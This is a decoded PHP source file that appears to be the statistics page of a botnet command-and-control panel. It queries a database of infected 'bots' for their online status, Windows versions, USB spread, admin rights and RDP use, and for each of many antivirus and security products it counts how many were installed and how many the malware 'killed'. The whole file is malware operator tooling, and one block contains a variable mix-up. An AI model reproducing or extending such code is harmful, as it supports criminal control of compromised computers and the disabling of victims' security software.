<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

if (!defined("IN_INDEX_PAGE")) {
    exit("..");
}
$sqlStats = new CSqlWrap();
$sqlStats->SetInternalLink($main_sql_link);
$sqlBots = new CClient();
$sqlBots->SetInternalLink($main_sql_link);
$sqlBots->Status_CorrectAllOnlineStatus();
$sqlBots->Status_CorrectAllDeadStatus();
$bEnableDeadBotStats = false;
$s_group_query = "";
$s_group_query_length = 0;
$s_clstatus_query = "";
$s_clstatus_query_length = 0;
$s_extended_query = "";
$s_current_group = isset($_GET["view_group"]) ? $_GET["view_group"] : "";
$s_current_group_len = strlen($s_current_group);
$current_view_group_text = $s_current_group === "" ? "<i>default</i>" : $s_current_group;
if (0 < $s_current_group_len && !ctype_alnum($s_current_group) || 12 < $s_current_group_len) {
    $s_current_group = "";
} else {
    if (strcasecmp($s_current_group, "all") == 0) {
        $s_current_group = "";
    }
}
if (0 < strlen($s_current_group)) {
    $s_current_group = strtolower($s_current_group);
    $s_group_query = " AND GroupName = '" . $s_current_group . "'";
}
if (isset($_GET["dead_stats"]) && is_numeric($_GET["dead_stats"]) && (int) $_GET["dead_stats"] != 0) {
    $s_clstatus_query = " AND ClientStatus >= " . BOT_STATUS_DEAD . "";
} else {
    $s_clstatus_query = " AND ClientStatus < " . BOT_STATUS_DEAD . "";
}
$s_group_query_length = (int) strlen($s_group_query);
$s_clstatus_query_length = (int) strlen($s_clstatus_query);
if (0 < $s_group_query_length || 0 < $s_clstatus_query_length) {
    $s_extended_query .= $s_group_query;
    $s_extended_query .= $s_clstatus_query;
}
$bIsPageSetForDeadBotStatistics = isset($_GET["dead_stats"]) && is_numeric($_GET["dead_stats"]) ? true : false;
$ClientStatusValue = $bIsPageSetForDeadBotStatistics ? BOT_STATUS_DEAD : BOT_STATUS_NO_STATUS_SPECIFIED;
$ClientStatusCompOperator = $bIsPageSetForDeadBotStatistics ? STATS_INTEGER_FIELD_OPERATOR_GREATER_THAN_OR_EQUAL_TO : STATS_INTEGER_FIELD_OPERATOR_LESS_THAN;
$sql_countries = $sqlStats->Query("SELECT COUNTRY_CODE2, COUNTRY_NAME FROM " . SQL_DATABASE . ".geoip GROUP BY COUNTRY_CODE2, COUNTRY_NAME");
$sql_countries_count = mysql_num_rows($sql_countries);
$groups = $sqlStats->Query("SELECT `GroupName` FROM " . SQL_DATABASE . ".clients WHERE ClientStatus >= " . BOT_STATUS_NO_STATUS_SPECIFIED . " GROUP BY `GroupName` ORDER BY FirstCheckIn ASC");
$total_bots_all_groups = $sqlBots->Stats_GetTotalBots();
$total_bots_per_group_and_clstatus = 0;
$total_bots = $sqlBots->Stats_GetTotalBotsEx($s_current_group, $ClientStatusValue, $ClientStatusCompOperator, $total_bots_per_group_and_clstatus);
$total_bots_edead = $sqlBots->Stats_GetTotalBotsEvenDead($s_current_group);
$total_botkill_query = $sqlBots->Query("SELECT SUM(BotsKilled) as TotalBotsKilled FROM " . SQL_DATABASE . ".clients WHERE BotsKilled > 0 " . $s_extended_query);
$total_persist_restore_query = $sqlBots->Query("SELECT SUM(FileRestoreCount) as TotalRestored FROM " . SQL_DATABASE . ".clients WHERE FileRestoreCount > 0 " . $s_extended_query);
$total_crash_restart_query = $sqlBots->Query("SELECT SUM(CrashRestartCount) as TotalRestarted FROM " . SQL_DATABASE . ".clients WHERE CrashRestartCount > 0 " . $s_extended_query);
$total_groups = $groups ? mysql_num_rows($groups) : 0;
$Num_Windows10 = 0;
$Num_Windows81 = 0;
$Num_Windows8 = 0;
$Num_Windows7 = 0;
$Num_Windows_Vista = 0;
$Num_Windows_XP = 0;
$Num_Windows_Server_2008 = 0;
$Num_Windows_Server_2003 = 0;
$Num_Windows_Unknown = 0;
$Num_Windows_x86 = 0;
$Num_Windows_x64 = 0;
$Num_Online = 0;
$Num_Online_3h = 0;
$Num_Online_24h = 0;
$Num_Online_2d = 0;
$Num_Online_3d = 0;
$Num_Online_4d = 0;
$Num_Online_5d = 0;
$Num_Online_7d = 0;
$Num_New_24h = 0;
$Num_New_USB_24h = 0;
$Num_Offline = 0;
$Num_Dead = 0;
$flt_stat_samsung = 0;
$flt_stat_apple = 0;
$total_bots_killed = 0;
$persist_restores = 0;
$crash_restarts = 0;
if ($total_botkill_query && ($row2 = mysql_fetch_assoc($total_botkill_query))) {
    $total_bots_killed = (int) $row2["TotalBotsKilled"];
}
if ($total_persist_restore_query && ($row2 = mysql_fetch_assoc($total_persist_restore_query))) {
    $persist_restores = (int) $row2["TotalRestored"];
}
if ($total_crash_restart_query && ($row2 = mysql_fetch_assoc($total_crash_restart_query))) {
    $crash_restarts = (int) $row2["TotalRestarted"];
}
if (isset($_POST["remove_notice_submit"]) && isset($_POST["remove_notice_id"])) {
    $notice_id = (int) $_POST["remove_notice_id"];
    if (!$sqlDefault->Query("DELETE FROM " . $sqlDefault->pdbname . ".notices WHERE id = " . $notice_id . " AND notice_options & " . NOTICE_OPTION_ALLOW_REMOVE . " LIMIT 1")) {
        _obfuscated_0D210D34132C0A390B285C1B37180F062D3D221C133E01_(NOTICE_TYPE_ERROR, "Failed to delete notice #" . $notice_id . " due to an SQL error (Error Num: " . mysql_errno() . ")", true, 1600);
    }
}
$sqlBots->Stats_GetOnlineInfo($Num_Online, $Num_Online_3h, $Num_Online_24h, $Num_Online_2d, $Num_Online_3d, $Num_Online_4d, $Num_Online_5d, $Num_Online_7d, $Num_New_24h, $Num_New_USB_24h, $Num_Offline, $Num_Dead, false, $s_current_group);
$sqlBots->Stats_GetOS($Num_Windows10, $Num_Windows81, $Num_Windows8, $Num_Windows7, $Num_Windows_Vista, $Num_Windows_XP, $Num_Windows_Server_2008, $Num_Windows_Server_2003, $Num_Windows_Unknown, $Num_Windows_x86, $Num_Windows_x64, false, $s_current_group, $ClientStatusValue, $ClientStatusCompOperator);
$Num_Avs_NoAV = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled = 0 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_NoAV) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Norton = 0;
$Num_AvsKilled_Norton = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000001 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Norton) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000001 AND AvsKilled & 0x00000001 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Norton) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Kaspersky = 0;
$Num_AvsKilled_Kaspersky = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000002 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Kaspersky) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000002 AND AvsKilled & 0x00000002 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Kaspersky) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_AVG = 0;
$Num_AvsKilled_AVG = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000004 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_AVG) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000004 AND AvsKilled & 0x00000004 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_AVG) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Avira = 0;
$Num_AvsKilled_Avira = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000008 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Avira) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000008 AND AvsKilled & 0x00000008 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Avira) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_ESET = 0;
$Num_AvsKilled_ESET = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000010 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_ESET) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000010 AND AvsKilled & 0x00000010 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_ESET) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_McAfee = 0;
$Num_AvsKilled_McAfee = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000020 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_McAfee) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000020 AND AvsKilled & 0x00000020 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_McAfee) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_TrendMicro = 0;
$Num_AvsKilled_TrendMicro = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000040 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_TrendMicro) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000040 AND AvsKilled & 0x00000040 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_TrendMicro) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Avast = 0;
$Num_AvsKilled_Avast = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000080 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Avast) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000080 AND AvsKilled & 0x00000080 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Avast) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_MSSE = 0;
$Num_AvsKilled_MSSE = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000100 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_MSSE) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000100 AND AvsKilled & 0x00000100 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_MSSE) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_BitDefender = 0;
$Num_AvsKilled_BitDefender = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000200 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_BitDefender) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000200 AND AvsKilled & 0x00000200 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_BitDefender) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_BullGuard = 0;
$Num_AvsKilled_BullGuard = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000400 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_BullGuard) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000400 AND AvsKilled & 0x00000400 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_BullGuard) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Rising = 0;
$Num_AvsKilled_Rising = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000800 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Rising) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00000800 AND AvsKilled & 0x00000800 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Rising) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_ArcaVir = 0;
$Num_AvsKilled_ArcaVir = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00001000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_ArcaVir) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00001000 AND AvsKilled & 0x00001000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_ArcaVir) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Webroot = 0;
$Num_AvsKilled_Webroot = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00002000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Webroot) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00002000 AND AvsKilled & 0x00002000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Webroot) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Emsisoft = 0;
$Num_AvsKilled_Emsisoft = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00004000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Emsisoft) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00004000 AND AvsKilled & 0x00004000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Emsisoft) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_FSecure = 0;
$Num_AvsKilled_FSecure = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00008000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_FSecure) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00008000 AND AvsKilled & 0x00008000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_FSecure) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Panda = 0;
$Num_AvsKilled_Panda = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00010000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Panda) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00010000 AND AvsKilled & 0x00010000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Panda) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_PcTools = 0;
$Num_AvsKilled_PcTools = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00020000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_PcTools) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00020000 AND AvsKilled & 0x00020000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_PcTools) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_GData = 0;
$Num_AvsKilled_GData = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00040000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_GData) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00040000 AND AvsKilled & 0x00040000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_GData) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_ZoneAlarm = 0;
$Num_AvsKilled_ZoneAlarm = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00080000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_ZoneAlarm) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00080000 AND AvsKilled & 0x00080000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_ZoneAlarm) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_BKav = 0;
$Num_AvsKilled_BKav = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00100000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_BKav) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00100000 AND AvsKilled & 0x00100000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_BKav) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Gbuster = 0;
$Num_AvsKilled_Gbuster = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00200000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Gbuster) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00200000 AND AvsKilled & 0x00200000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Gbuster) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_DrWeb = 0;
$Num_AvsKilled_DrWeb = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00400000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_DrWeb) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00400000 AND AvsKilled & 0x00400000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_DrWeb) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_SophosEndpoint = 0;
$Num_AvsKilled_SophosEndpoint = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00800000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_SophosEndpoint) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x00800000 AND AvsKilled & 0x00800000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_SophosEndpoint) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_Comodo = 0;
$Num_AvsKilled_Comodo = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x01000000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_Comodo) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x01000000 AND AvsKilled & 0x01000000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_Comodo) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_AhnlabV3 = 0;
$Num_AvsKilled_AhnlabV3 = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x02000000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_AhnlabV3) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x02000000 AND AvsKilled & 0x02000000 " . $s_extended_query);
    if ($av_query) {
        list($Num_AvsKilled_DrWeb) = mysql_fetch_row($av_query);
        mysql_free_result($av_query);
    }
} else {
    $Num_Avs_AhnlabV3 = 0;
}
$Num_Avs_BaiduFree = 0;
$Num_AvsKilled_BaiduFree = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x04000000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_BaiduFree) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x04000000 AND AvsKilled & 0x04000000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_BaiduFree) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Avs_MalwareBytes = 0;
$Num_AvsKilled_MalwareBytes = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x08000000 " . $s_extended_query);
if ($av_query) {
    list($Num_Avs_MalwareBytes) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
    $av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled & 0x08000000 AND AvsKilled & 0x08000000 " . $s_extended_query);
}
if ($av_query) {
    list($Num_AvsKilled_MalwareBytes) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_AdwCleaner = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000001 " . $s_extended_query);
if ($av_query) {
    list($Num_AdwCleaner) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Combofix = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000002 " . $s_extended_query);
if ($av_query) {
    list($Num_Combofix) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Adaware = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000004 " . $s_extended_query);
if ($av_query) {
    list($Num_Adaware) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_SpybotSearchAndDestroy = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000008 " . $s_extended_query);
if ($av_query) {
    list($Num_SpybotSearchAndDestroy) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_Bankerfix = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000010 " . $s_extended_query);
if ($av_query) {
    list($Num_Bankerfix) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_HouseCall = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000020 " . $s_extended_query);
if ($av_query) {
    list($Num_HouseCall) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_HijackThis = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000040 " . $s_extended_query);
if ($av_query) {
    list($Num_HijackThis) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$Num_TrusteerRapport = 0;
$av_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SecurityToolsInstalled & 0x00000080 " . $s_extended_query);
if ($av_query) {
    list($Num_TrusteerRapport) = mysql_fetch_row($av_query);
    mysql_free_result($av_query);
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_HAS_NET_FRAMEWORK . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_dotnet) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_dotnet = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_HAS_USED_RDP . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_rdp) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_rdp = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_IS_ELEVATED . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_is_admin) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_is_admin = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_HAS_SAMSUNG_DEVICE . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_samsung) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_samsung = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE ClientAttributes & " . BOT_ATTRIBUTE_HAS_APPLE_DEVICE . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_apple) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_apple = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE AvsInstalled = 0 " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_noav) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_noav = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_JAVA . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_java) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_java = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_SKYPE . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_skype) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_skype = 0;
}
$flt_query = $sqlBots->Query("SELECT COUNT(id) FROM " . SQL_DATABASE . ".clients WHERE SoftwareInstalled & " . BOT_SOFTWARE_VISUAL_STUDIO . " " . $s_extended_query);
if ($flt_query) {
    list($flt_stat_visualstudio) = mysql_fetch_row($flt_query);
    mysql_free_result($flt_query);
} else {
    $flt_stat_visualstudio = 0;
}
